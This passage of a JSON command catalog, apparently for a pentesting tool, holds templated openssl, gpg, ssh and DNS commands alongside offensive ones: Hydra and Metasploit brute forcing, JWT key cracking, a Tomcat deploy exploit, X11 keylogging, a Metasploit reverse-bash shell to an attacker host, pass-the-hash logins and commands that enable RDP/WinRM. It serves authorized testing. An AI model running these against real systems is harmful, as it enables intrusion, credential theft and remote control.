"Create a new self-signed certificate", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "req -x509 -sha256 -nodes -days <VALIDITY> -newkey rsa:<RSA_LENGTH> -out <OUTPUT_CRT> -keyout <OUTPUT_KEY>", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Create a signing request from existing key", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "req -out <OUTPUT_CSR> -key <INPUT_KEY> -new", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Create a signing request from existing certificate and key", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "x509 -x509toreq -out <OUTPUT_CSR> -in <INPUT_CRT> -signkey <INPUT_KEY>", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Remove a passphrase from a private key", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "rsa -in <INPUT_KEY> -out <OUTPUT_PLAINTEXT_KEY>", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Convert a DER encoded file to a PEM encoded file", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "x509 -inform der -in <INPUT_CRT> -out <OUTPUT_PEM>", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Convert a PEM encoded file to a DER encoded file", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "x509 -outform der -in <INPUT_PEM> -out <OUTPUT_CRT>", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Convert a PKCS12 encoded file containing a private key and certificates to PEM", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "pkcs12 -in <INPUT_PKCS12> -out <OUTPUT_PEM> -nodes", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Extract the private key from a PKCS12 encoded file", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "pkcs12 -in <INPUT_PKCS12> -out <OUTPUT_PEM> -nodes -nocerts", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Extract the certificate from a PKCS12 encoded file", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "pkcs12 -in <INPUT_PKCS12> -out <OUTPUT_PEM> -nodes -nokeys", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Convert a PEM certificate file and a private key to PKCS12 encoded file", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "pkcs12 -export -out <OUTPUT_PKCS12> -inkey <INPUT_KEY> -in <INPUT_CRT> -certfile <INPUT_CRT>", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Validate a certificate signing request", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "req -text -noout -verify -in <OUTPUT_CSR>", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Validate a private key", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "rsa -in <INPUT_KEY> -check", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Validate a certificate", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "x509 -in <INPUT_CRT> -text -noout", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Validate a PKCS12 file (.pfx or .p12)", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "pkcs12 -info -in <INPUT_PKCS12>", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Compare the MD5 hash of a certificate", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "x509 -noout -modulus -in <INPUT_CRT> | openssl md5", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Compare the MD5 hash of a private key", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "rsa -noout -modulus -in <INPUT_KEY> | openssl md5", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Compare the MD5 hash of a certificate signing request", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "req -noout -modulus -in <INPUT_CSR> | openssl md5", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Display the server certificate chain", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "s_client -connect <URL>:<PORT>", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Jwt tool Mode all tests", "description": "", "executable_type": "custom", "executable_path": "python3", "arguments": "jwt_tool.py -M at -t \"<url>\" -rh \"Authorization: Bearer <JWT_Token>\" -rh \"<other_header>\" -rc \"<cookies>\"", "tags": "[\"jwttool\", \"token\", \"jwt\"]", "more_info_url": null}, {"name": "Jwt tool reuse query id", "description": "", "executable_type": "custom", "executable_path": "python3", "arguments": "jwt_tool.py -Q \"<jwttool_id>\"", "tags": "[\"jwttool\", \"token\", \"jwt\"]", "more_info_url": null}, {"name": "Jwt tool bruteforce key", "description": "", "executable_type": "custom", "executable_path": "python3", "arguments": "jwt_tool.py -d <wordlists.txt> <JWT_token>", "tags": "[\"jwttool\", \"token\", \"jwt\"]", "more_info_url": null}, {"name": "wpscan with docker and burp proxy", "description": "", "executable_type": "custom", "executable_path": "sudo", "arguments": "docker run -it --network host --rm wpscanteam/wpscan --proxy http://127.0.0.1:8080 --url <url> --disable-tls-checks -e ap,tt,cb,dbe,u1-20,m --api-token <wpscan_apitoken>", "tags": "[\"wpscan\", \"wordpress\"]", "more_info_url": null}, {"name": "tomcat manager bruteforce", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use auxiliary/scanner/http/tomcat_enum\"", "tags": "[\"tomcat\"]", "more_info_url": null}, {"name": "tomcat deploy", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploit/multi/http/tomcat_mgr_deploy\"", "tags": "[\"tomcat\"]", "more_info_url": null}, {"name": "extract links from an url", "description": "", "executable_type": "custom", "executable_path": "curl", "arguments": "-k -s <url> | grep -o 'http://[^\"]*' | cut -d \"/\" -f 3 | sort -u", "tags": "[\"web\"]", "more_info_url": null}, {"name": "Hydra - ssh - userlist and password list - 22", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-L <userlist> -P <passlist> <ip> ssh", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - ssh - user and password  - 22", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-l <user|root> -p <password|root> <ip> ssh", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - ssh - user=password - 22", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-L <userlist> -e s <ip> ssh", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - ssh - null password - 22", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-l <user|root> -e n <ip> ssh", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - ssh - password=reverseuser - 22", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-L <userlist> -e r <ip> ssh", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - ssh - file \"login:pass\" format - 22", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-C <file_login_pass> <ip> ssh", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - ftp - 21 ", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-L <userlist> -P <passlist> <ip> ftp", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - smb - 445", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-L <userlist> -P <passlist> <ip> smb", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - mysql - 3306", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-L <userlist> -P <passlist> <ip> mysql", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - vnc - 5900", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-L <userlist> -P <passlist> <ip> vnc", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - postgres - 5432", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-L <userlist> -P <passlist> <ip> postgres", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "Hydra - telnet - 23", "description": "", "executable_type": "custom", "executable_path": "hydra", "arguments": "-L <userlist> -P <passlist> <ip> telnet", "tags": "[\"bruteforce\", \"access\"]", "more_info_url": null}, {"name": "cewl - wordlist creation", "description": "Build a custom wordlist scraping words from a website.", "executable_type": "custom", "executable_path": "cewl", "arguments": "-w <file|wordlist.txt> -d <deep|3> -m <min_word_size|5> <url>", "tags": "[\"wordlist\", \"bruteforce\", \"dict\"]", "more_info_url": null}, {"name": "crunch - generate wordlist hex", "description": "", "executable_type": "custom", "executable_path": "crunch", "arguments": "<min|2> <max|8> 0123456789ABCDEF -o <output.txt>", "tags": "[\"wordlist\", \"bruteforce\", \"dict\"]", "more_info_url": null}, {"name": "crunch - generate wordlist charset", "description": "", "executable_type": "custom", "executable_path": "crunch", "arguments": "<min> <max> -f /usr/share/crunch/charset.lst <charset|mixalpha-numeric> -o <output.txt>", "tags": "[\"wordlist\", \"bruteforce\", \"dict\"]", "more_info_url": null}, {"name": "crunch - generate wordlist Upper(,) lower(@)x3 numeric(%)x3 special(^)x1", "description": "- @ will insert lower case characters\n- , will insert upper case characters\n- % will insert numbers\n- ^ will insert symbols", "executable_type": "custom", "executable_path": "crunch", "arguments": "8 8 -t <pattern|,@@@%%%^> -o <output.txt>", "tags": "[\"wordlist\", \"bruteforce\", \"dict\"]", "more_info_url": null}, {"name": "crunch - generate wordlist contain \"password\", 2 numbers and 1 special char", "description": "", "executable_type": "custom", "executable_path": "crunch", "arguments": "8 8 -t password%%^ -o <output.txt>", "tags": "[\"wordlist\", \"bruteforce\", \"dict\"]", "more_info_url": null}, {"name": "gpg version", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--version", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "gpg generate key", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--gen-key", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "list keys", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--list-keys", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "distribute public key to key server", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--keyserver <key_server> --send-keys <public_key>", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "export public key", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--output <filename_gpg> --export <key_name>", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "import public key", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--import <filename_gpg>", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "encrypt document", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--output <output_filename_gpg> --encrypt --recipient <public_key> <input_filename>", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "decrypt document", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--output <filename> --decrypt <filename_gpg>", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "make a signature", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--output <filename_sig> --sign <filename>", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "verify signature", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--output <filename> <filename> --decrypt <filename_sig>", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "clearsign documents", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--clearsign <filename>", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "detach signature", "description": "", "executable_type": "custom", "executable_path": "gpg", "arguments": "--output <filename_sig> --detach-sig <filename>", "tags": "[\"gpg\"]", "more_info_url": null}, {"name": "nfs showmount", "description": "", "executable_type": "custom", "executable_path": "showmount", "arguments": "-e <ip>", "tags": "[\"nfs\", \"showmount\", \"2049\"]", "more_info_url": null}, {"name": "nfs - nmap showmount", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sV --script=nfs-showmount <ip>", "tags": "[\"nfs\", \"showmount\", \"2049\"]", "more_info_url": null}, {"name": "nfs - mount", "description": "", "executable_type": "custom", "executable_path": "mount", "arguments": "-t nfs <ip>:<shared_folder> <mount_point> -o nolock", "tags": "[\"nfs\", \"showmount\", \"2049\"]", "more_info_url": null}, {"name": "nfs - mount with v2 (no authenrt=)", "description": "", "executable_type": "custom", "executable_path": "mount", "arguments": "-t nfs -o vers=2 <ip>:<shared_folder> <mount_point> -o nolock", "tags": "[\"nfs\", \"showmount\", \"2049\"]", "more_info_url": null}, {"name": "x11 - check anonymous connection", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sV --script x11-access -p <port> <ip>", "tags": "[\"x11\", \"6000\"]", "more_info_url": null}, {"name": "x11 - verify connection", "description": "", "executable_type": "custom", "executable_path": "xdpyinfo", "arguments": "-display <ip>:<display>", "tags": "[\"x11\", \"6000\"]", "more_info_url": null}, {"name": "x11 - verify connection (2)", "description": "", "executable_type": "custom", "executable_path": "xwininfo", "arguments": "-root -tree -display <ip>:<display>", "tags": "[\"x11\", \"6000\"]", "more_info_url": null}, {"name": "X11 - screenshot", "description": "", "executable_type": "custom", "executable_path": "xwd", "arguments": "\u2013root \u2013screen \u2013silent \u2013display <ip>:<display> > screenshot.xwd; convert screenshot.xwd screenshot.png", "tags": "[\"x11\", \"6000\"]", "more_info_url": null}, {"name": "X11 - keylogging", "description": "", "executable_type": "custom", "executable_path": "xspy", "arguments": "<ip>", "tags": "[\"x11\", \"6000\"]", "more_info_url": null}, {"name": "X11 - remote desktop view", "description": "", "executable_type": "custom", "executable_path": "xrdp", "arguments": "<ip>:<display>", "tags": "[\"x11\", \"6000\"]", "more_info_url": null}, {"name": "X11 - msf reverse shell", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploit/unix/x11/x11_keyboard_exec; set RHOSTS <rhost>; set payload cmd/unix/reverse_bash; set lhost <lhost>; set lport <lport>; exploit\"", "tags": "[\"x11\", \"6000\"]", "more_info_url": null}, {"name": "Start ssh agent", "description": "", "executable_type": "custom", "executable_path": "eval", "arguments": "\"$(ssh-agent -s)\"; ssh-add", "tags": "[\"ssh\", \"22\"]", "more_info_url": null}, {"name": "SSH local port forwarding (get remote_port on local)", "description": "", "executable_type": "custom", "executable_path": "ssh", "arguments": "-L <local_port>:<remote_host>:<remote_port> <user>@<ip>", "tags": "[\"ssh\", \"22\"]", "more_info_url": null}, {"name": "SSH remote port forwarding (send local port to remote) (need GatewayPorts yes)", "description": "", "executable_type": "custom", "executable_path": "ssh", "arguments": "-R <remote_binding>:<remote_port>:<local_host>:<local_port> <user>@<ip>", "tags": "[\"ssh\", \"22\"]", "more_info_url": null}, {"name": "SSH proxysocks", "description": "", "executable_type": "custom", "executable_path": "ssh", "arguments": "-D <socks_port> <user>@<ip>", "tags": "[\"ssh\", \"22\"]", "more_info_url": null}, {"name": "get public ssh key of server", "description": "", "executable_type": "custom", "executable_path": "ssh-keyscan", "arguments": "-t rsa <IP> -p <PORT>", "tags": "[\"ssh\", \"22\"]", "more_info_url": null}, {"name": "msf - bruteforce username", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use scanner/ssh/ssh_enumusers; set RHOSTS <ip>; set USER_FILE <user_file>; set CHECK_FALSE true; exploit\"", "tags": "[\"ssh\", \"22\"]", "more_info_url": null}, {"name": "SSH - old algorithm", "description": "", "executable_type": "custom", "executable_path": "ssh", "arguments": "-oKexAlgorithms=+diffie-hellman-group1-sha1 <user>@<ip>", "tags": "[\"ssh\", \"22\"]", "more_info_url": null}, {"name": "enable RDP", "description": "", "executable_type": "custom", "executable_path": "reg", "arguments": "add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "tags": "[\"rdp\", \"windows\", \"3389\"]", "more_info_url": null}, {"name": "enable restricted admin", "description": "", "executable_type": "custom", "executable_path": "New-ItemProperty", "arguments": "-Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name DisableRestrictedAdmin -Value 0", "tags": "[\"rdp\", \"windows\", \"3389\"]", "more_info_url": null}, {"name": "disable restricted admin", "description": "", "executable_type": "custom", "executable_path": "Remove-ItemProperty", "arguments": "-Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name DisableRestrictedAdmin", "tags": "[\"rdp\", \"windows\", \"3389\"]", "more_info_url": null}, {"name": "rdp from console", "description": "", "executable_type": "custom", "executable_path": "sharprdp.exe", "arguments": "computername=<computer> command=\"<command>\" username=<domain>\\<user> password=<password>", "tags": "[\"rdp\", \"windows\", \"3389\"]", "more_info_url": null}, {"name": "Add firewall authorisation RDP", "description": "", "executable_type": "custom", "executable_path": "netsh.exe", "arguments": "advfirewall firewall add rule name=\"Remote Desktop - User Mode (TCP-In)\" dir=in action=allow program=\"%%SystemRoot%%\\system32\\svchost.exe\" service=\"TermService\" description=\"Inbound rule for the Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script\" enable=yes profile=private,domain localport=3389 protocol=tcp", "tags": "[\"rdp\", \"windows\", \"3389\"]", "more_info_url": null}, {"name": "rdesktop - classic", "description": "", "executable_type": "custom", "executable_path": "rdesktop", "arguments": "-g 90% <ip> -u <user> -p <password> -d <domain>", "tags": "[\"rdp\", \"windows\"]", "more_info_url": null}, {"name": "rdesktop - with share", "description": "", "executable_type": "custom", "executable_path": "rdesktop", "arguments": "-g 90% <ip> -u <user> -p <password> -d <domain> -r disk:share=<share>", "tags": "[\"rdp\", \"windows\"]", "more_info_url": null}, {"name": "xfreerdp - classic", "description": "", "executable_type": "custom", "executable_path": "xfreerdp", "arguments": "/u:<user> /p:<password> /d:<domain> /v:<ip> /size:1800x924", "tags": "[\"rdp\", \"windows\"]", "more_info_url": null}, {"name": "xfreerdp - with share", "description": "", "executable_type": "custom", "executable_path": "xfreerdp", "arguments": "/u:<user> /p:<password> /d:<domain> /v:<ip> /size:1800x924 /drive:share,<share>", "tags": "[\"rdp\", \"windows\"]", "more_info_url": null}, {"name": "xfreerdp - pass the hash", "description": "", "executable_type": "custom", "executable_path": "xfreerdp", "arguments": "/u:<user> /pth:<hash> /d:<domain> /v:<ip>", "tags": "[\"rdp\", \"windows\"]", "more_info_url": null}, {"name": "Enable winrm (powershell)", "description": "", "executable_type": "custom", "executable_path": "Enable-PSRemoting", "arguments": "-Force;\\\nSet-Item wsman:\\localhost\\client\\trustedhosts *", "tags": "[\"windows\", \"remote\", \"winrm\", \"evilwinrm\", \"5985\", \"5986\"]", "more_info_url": null}, {"name": "Enable winrm (wmic)", "description": "", "executable_type": "custom", "executable_path": "wmic", "arguments": "/node:<REMOTE_HOST> process call create \"powershell enable-psremoting -force\"", "tags": "[\"windows\", \"remote\", \"winrm\", \"evilwinrm\", \"5985\", \"5986\"]", "more_info_url": null}, {"name": "Test target is configure to use winrm (powershell)", "description": "", "executable_type": "custom", "executable_path": "Test-WSMan", "arguments": "-computername <computername>", "tags": "[\"windows\", \"remote\", \"winrm\", \"evilwinrm\", \"5985\", \"5986\"]", "more_info_url": null}, {"name": "Execute a command on the target over winrm (powershell)", "description": "", "executable_type": "custom", "executable_path": "Invoke-Command", "arguments": "-computername <computername> -ScriptBlock {<cmd>} -credential <domain>\\<username>", "tags": "[\"windows\", \"remote\", \"winrm\", \"evilwinrm\", \"5985\", \"5986\"]", "more_info_url": null}, {"name": "Execute a script on the target over winrm (powershell)", "description": "", "executable_type": "custom", "executable_path": "Invoke-Command", "arguments": "-ComputerName <computername> -FilePath <path_to_script> -credential <domain>\\<username>", "tags": "[\"windows\", \"remote\", \"winrm\", \"evilwinrm\", \"5985\", \"5986\"]", "more_info_url": null}, {"name": "Get a powershell session with winrm (powershell)", "description": "", "executable_type": "custom", "executable_path": "Enter-PSSession", "arguments": "-ComputerName <computername> -Credential <domain>\\<username>", "tags": "[\"windows\", \"remote\", \"winrm\", \"evilwinrm\", \"5985\", \"5986\"]", "more_info_url": null}, {"name": "Enable winrm remotelly from psexec", "description": "", "executable_type": "custom", "executable_path": ".\\PsExec.exe", "arguments": "\\\\<computername> -u <domain>\\<username> -p <password> -h -d powershell.exe \"enable-psremoting -force\"", "tags": "[\"windows\", \"remote\", \"winrm\", \"evilwinrm\", \"5985\", \"5986\"]", "more_info_url": null}, {"name": "evil-winrm install", "description": "", "executable_type": "custom", "executable_path": "gem", "arguments": "install evil-winrm", "tags": "[\"windows\", \"remote\", \"winrm\", \"evilwinrm\", \"5985\", \"5986\"]", "more_info_url": null}, {"name": "evil-winrm use", "description": "", "executable_type": "custom", "executable_path": "evil-winrm", "arguments": "-i <ip>/<domain> -u <user> -p <password>", "tags": "[\"windows\", \"remote\", \"winrm\", \"evilwinrm\", \"5985\", \"5986\"]", "more_info_url": null}, {"name": "evil-winrm use pass the hash", "description": "", "executable_type": "custom", "executable_path": "evil-winrm", "arguments": "-i <ip>/<domain> -u <user> -H <hash>", "tags": "[\"windows\", \"remote\", \"winrm\", \"evilwinrm\", \"5985\", \"5986\"]", "more_info_url": null}, {"name": "ftp - download all ", "description": "", "executable_type": "custom", "executable_path": "wget", "arguments": "-m ftp://anonymous:anonymous@<ip>", "tags": "[\"ftp\", \"21\"]", "more_info_url": null}, {"name": "ftp download all (2)", "description": "", "executable_type": "custom", "executable_path": "wget", "arguments": "-m --no-passive ftp://anonymous:anonymous@<ip>", "tags": "[\"ftp\", \"21\"]", "more_info_url": null}, {"name": "ftp - connect", "description": "", "executable_type": "custom", "executable_path": "ftp", "arguments": "<ip>", "tags": "[\"ftp\", \"21\"]", "more_info_url": null}, {"name": "ftp - connect port", "description": "", "executable_type": "custom", "executable_path": "ftp", "arguments": "<ip> <port>", "tags": "[\"ftp\", \"21\"]", "more_info_url": null}, {"name": "ftp - enum anonym", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-v -p 21 --script=ftp-anon.nse <ip>", "tags": "[\"ftp\", \"21\"]", "more_info_url": null}, {"name": "ftp - msf bruteforce login", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use auxiliary/scanner/ftp/ftp_login; set RHOSTS <ip>; set USER_FILE <user_file>; set PASS_FILE <password_file>; exploit\"", "tags": "[\"ftp\", \"21\"]", "more_info_url": null}, {"name": "ldap nmap", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-n -sV --script \"ldap* and not brute\" -p 389 <ip>", "tags": null, "more_info_url": null}, {"name": "ldapsearch base", "description": "", "executable_type": "custom", "executable_path": "ldapsearch", "arguments": "-x -h <ip> -s base", "tags": null, "more_info_url": null}, {"name": "ldapsearch SPN", "description": "", "executable_type": "custom", "executable_path": "ldapsearch", "arguments": "-Y GSSAPI -H ldap://<dc_fqdn> -D \"<user>\" -W -b \"dc=<domain_name>,dc=com\" \"servicePrincipalName=*\" servicePrincipalName", "tags": null, "more_info_url": null}, {"name": "ldapsearch with base dn", "description": "", "executable_type": "custom", "executable_path": "ldapsearch", "arguments": "-x -h <ip> -b <basedn>", "tags": null, "more_info_url": null}, {"name": "ldapsearch base with authentication", "description": "", "executable_type": "custom", "executable_path": "ldapsearch", "arguments": "-x -h <ip> -D <domain>\\\\<username> -w <password> -b 'DC=<domain>,DC=<path>'", "tags": null, "more_info_url": null}, {"name": "ldapdomaindump", "description": "", "executable_type": "custom", "executable_path": "ldapdomaindump", "arguments": "--no-json --no-grep --authtype SIMPLE -o ldap_dump -r <ip> -u <domain>\\\\<username> -p <password>", "tags": null, "more_info_url": null}, {"name": "nmap, snmp scan", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sU --open -p 161 -sC -sV <ip>", "tags": "[\"snmp\", \"161\"]", "more_info_url": null}, {"name": "nmap, snmp brute", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sU --open -p 161 --script=snmp-brute <ip> --script-args snmp-brute.communitiesdb=<snmp_community_strings_file>", "tags": "[\"snmp\", \"161\"]", "more_info_url": null}, {"name": "onesixtyone", "description": "", "executable_type": "custom", "executable_path": "echo", "arguments": "public > community; echo private >> community; echo manager >> community; onesixtyone -c community -i ips; rm community", "tags": "[\"snmp\", \"161\"]", "more_info_url": null}, {"name": "snmpwalk entire tree", "description": "", "executable_type": "custom", "executable_path": "snmpwalk", "arguments": "-c public -v1 <ip>", "tags": "[\"snmp\", \"161\"]", "more_info_url": null}, {"name": "snmpwalk - list running processes", "description": "", "executable_type": "custom", "executable_path": "snmpwalk", "arguments": "-c private -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2", "tags": "[\"snmp\", \"161\"]", "more_info_url": null}, {"name": "snmp-check - check snmp service on specified port (default:162)", "description": "", "executable_type": "custom", "executable_path": "snmp-check", "arguments": "-t <ip> -c public -p 162", "tags": "[\"snmp\", \"161\"]", "more_info_url": null}, {"name": "postgres - connect", "description": "", "executable_type": "custom", "executable_path": "psql", "arguments": "-h <host> -U <user>", "tags": "[\"postgres\", \"5432\", \"5433\"]", "more_info_url": null}, {"name": "postgres - connect database", "description": "", "executable_type": "custom", "executable_path": "psql", "arguments": "-h <ip> -U <user> -d <database>", "tags": "[\"postgres\", \"5432\", \"5433\"]", "more_info_url": null}, {"name": "postgres - connect full options", "description": "", "executable_type": "custom", "executable_path": "psql", "arguments": "-h <ip> -p <port> -U <user> -W <password> <database>", "tags": "[\"postgres\", \"5432\", \"5433\"]", "more_info_url": null}, {"name": "host find name server", "description": "", "executable_type": "custom", "executable_path": "host", "arguments": "-t ns <domain>", "tags": "[\"dns\", \"host\", \"53\"]", "more_info_url": null}, {"name": "host find mail server", "description": "", "executable_type": "custom", "executable_path": "host", "arguments": "-t mx <domain>", "tags": "[\"dns\", \"host\", \"53\"]", "more_info_url": null}, {"name": "dig dns lookup", "description": "", "executable_type": "custom", "executable_path": "dig", "arguments": "<domain_name> @1.1.1.1", "tags": "[\"dns\", \"dig\", \"53\"]", "more_info_url": null}, {"name": "dig any information", "description": "", "executable_type": "custom", "executable_path": "dig", "arguments": "ANY <domain_name> @<dns_ip>", "tags": "[\"dns\", \"dig\", \"53\"]", "more_info_url": null}, {"name": "dig reverse lookup", "description": "", "executable_type": "custom", "executable_path": "dig", "arguments": "-x <ip> @<dns_ip>", "tags": "[\"dns\", \"dig\", \"53\"]", "more_info_url": null}, {"name": "dig zone transfer", "description": "", "executable_type": "custom", "executable_path": "dig", "arguments": "axfr <domain_name> @<name_server>", "tags": "[\"dns\", \"dig\", \"53\"]", "more_info_url": null}, {"name": "dig, find external, public IP address", "description": "", "executable_type": "custom", "executable_path": "dig", "arguments": "+short <domain_name> @resolver1.opendns.com", "tags": "[\"dns\", \"dig\", \"53\"]", "more_info_url": null}, {"name": "dig, find domains file ip address value", "description": "", "executable_type": "custom", "executable_path": "dig", "arguments": "-f <domains.txt> +noall +answer", "tags": "[\"dns\", \"dig\", \"53\"]", "more_info_url": null}, {"name": "dig, find domains file MX ip record", "description": "", "executable_type": "custom", "executable_path": "dig", "arguments": "-f <domains.txt> MX +noall +answer", "tags": "[\"dns\", \"dig\", \"53\"]", "more_info_url": null}, {"name": "dnsrecon standard enum on domain", "description": "", "executable_type": "custom", "executable_path": "dnsrecon", "arguments": "-d <domain>", "tags": "[\"dns\", \"dnsrecon\", \"53\"]", "more_info_url": null}, {"name": "dnsrecon zone transfer", "description": "", "executable_type": "custom", "executable_path": "dnsrecon", "arguments": "-d <domain> -t axfr", "tags": "[\"dns\", \"dnsrecon\", \"53\"]", "more_info_url": null}, {"name": "dnsrecon reverse lookup start/end ip", "description": "", "executable_type": "custom", "executable_path": "dnsrecon", "arguments": "-r <startip>-<endip> -n <domain_name_server>", "tags": "[\"dns\", \"dnsrecon\", \"53\"]", "more_info_url": null}, {"name": "dnsrecon reverse lookup network range ip", "description": "", "executable_type": "custom", "executable_path": "dnsrecon", "arguments": "-r <ip_with_network_mask> -n <domain_name_server>", "tags": "[\"dns\", \"dnsrecon\", \"53\"]", "more_info_url": null}, {"name": "dnsrecon domain bruteforce", "description": "", "executable_type": "custom", "executable_path": "dnsenum", "arguments": "<domain>", "tags": "[\"dns\", \"dnsenum\", \"53\"]", "more_info_url": null}, {"name": "nmap grab banner", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sV -p 53 --script dns-nsid <ip>", "tags": "[\"dns\", \"nmap\", \"53\"]", "more_info_url": null}, {"name": "nmap dns tcp", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-n -sV --script \"(*dns* and (default or (discovery and safe))) or dns-random-txid or dns-random-srcport\" -p 53 <ip>", "tags": "[\"dns\", \"nmap\", \"53\"]", "more_info_url": null}, {"name": "nmap dns udp", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-n -sV -sU --script \"\"(*dns* and (default or (discovery and safe))) or dns-random-txid or dns-random-srcport\" -p 53 <ip>", "tags": "[\"dns\", \"nmap\", \"53\"]", "more_info_url": null}, {"name": "nmap activedirectory enum", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "--script dns-srv-enum --script-args \"dns-srv-enum.domain='<domain>'\"", "tags": "[\"dns\", \"nmap\", \"53\"]", "more_info_url": null}, {"name": "nmap dnssec ", 